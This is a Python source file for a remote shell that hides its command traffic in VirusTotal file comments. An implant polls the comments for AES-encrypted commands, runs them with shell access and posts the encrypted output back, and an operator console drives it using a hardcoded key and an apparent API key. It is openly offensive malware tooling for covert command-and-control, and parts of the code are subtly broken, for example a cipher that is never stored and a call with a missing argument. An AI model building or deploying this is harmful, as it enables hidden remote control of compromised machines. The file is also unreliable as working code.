from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
from os import urandom
import base64
import requests
import hashlib
import subprocess
import time



class VtApi(object):
    
    def __init__(self,vtapi):
        self.vtapi = vtapi
        
    
    def readComment(self,hashSource,enc):
        url = "https://www.virustotal.com/api/v3/files/"+hashSource+"/comments?limit=1"
        headers = {
            "accept": "application/json",
            "x-apikey": self.vtapi
        }
        r = requests.get(url, headers=headers)
        if r.status_code != 200:
            return False
        res = r.json()
        try:
            comment = res['data'][0]['attributes']['text']
            if comment == enc:
                return False
            self.deleteComment(res['data'][0]['id'])
        except Exception as e:
            return False
        return comment
    
    def postComment(self,hashSource,comment):
        url = "https://www.virustotal.com/api/v3/files/"+hashSource+"/comments"
        payload = {"data": {
                "type": "comment",
                "attributes": {"text": comment}}}
        headers = {
            "accept": "application/json",
            "x-apikey": self.vtapi,
            "content-type": "application/json"}
        response = requests.post(url, json=payload, headers=headers)
        
        
    def deleteComment(self,uid):
        url = "https://www.virustotal.com/api/v3/comments/"+uid
        headers = {
            "accept": "application/json",
            "x-apikey": self.vtapi
        }
        r = requests.delete(url, headers=headers)
        if r.status_code == 200:
            return True
        return False
        
           
#     def postFile(self,path):
        

class AES_encryption(object):

    def __init__(self,key):
        self.key=key
        iv = hashlib.md5(key).digest()
        self.cipher=AES.new(key, AES.MODE_CBC, iv)

    def pad_data(self,data):
        return data + bytes(len(data)%16) + bytes([len(data)%16])

    def encrypt_data_aes(self,data):
        return base64.b64encode(self.cipher.encrypt(pad(data,AES.block_size)))

    def decrypt_data_aes(self,data):
        return unpad(self.cipher.decrypt(base64.b64decode(data)),AES.block_size)
    
    def randomKey(self):
        return urandom(32)
    
        
class ReverseShell(object):
    
    def __init__(self,api,hashSource):
        self.vt = VtApi(api)
        self.hashSource = hashSource
        cipher = AES_encryption(b'\xc4A:\x05*1\xc6m}\xe9\xdf_b\x8f\xe60\x99K\x07<``\xdf\xc1LblZQ\x12\xf9\x07')
        
    def cmd(self,command):
        p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        return p.stdout.read().strip()
    
    
    def run(self):
        while True:
            command = self.vt.readComment(self.hashSource)
            if command:
                command = self.cipher.decrypt_data_aes(command.encode())
                out = self.cipher.encrypt_data_aes(self.cmd(command)).decode()
                print(out)
                self.vt.postComment(self.hashSource,out)
                
            
            
class ManageShell(object):
    
    def __init__(self,api,hashSource):
        self.vt = VtApi(api)
        self.hashSource = hashSource
        self.key = b'\xc4A:\x05*1\xc6m}\xe9\xdf_b\x8f\xe60\x99K\x07<``\xdf\xc1LblZQ\x12\xf9\x07'
        
    def encrypt(self,data):
        c = AES_encryption(self.key)
        return c.encrypt_data_aes(data)
    
    def decrypt(self,data):
        c = AES_encryption(self.key)
        return c.decrypt_data_aes(data)
        
    
    def catchOut(self,enc):
        c = 0 
        while True:
            try:
                out = self.vt.readComment(self.hashSource,enc)
                if out:
                    print(out)
                    return self.decrypt(out.encode())
            except Exception as e: 
                print(e)
                pass
            if c > 15: return "Connection failed.."
            time.sleep(1)
            c+=1
        
    def run(self):
        while True:
            command = input('-> ')
            enc = self.encrypt(command.encode())
            self.vt.postComment(self.hashSource,enc.decode())
            print(self.catchOut(enc.decode()))


ManageShell('9319037194560c58c0bd655fce266ece7e3208926c953e294419beb70f728182','0d327187e9e52f0f67535424077562c370667d5bb6c663badaa46743edba59e9').run()

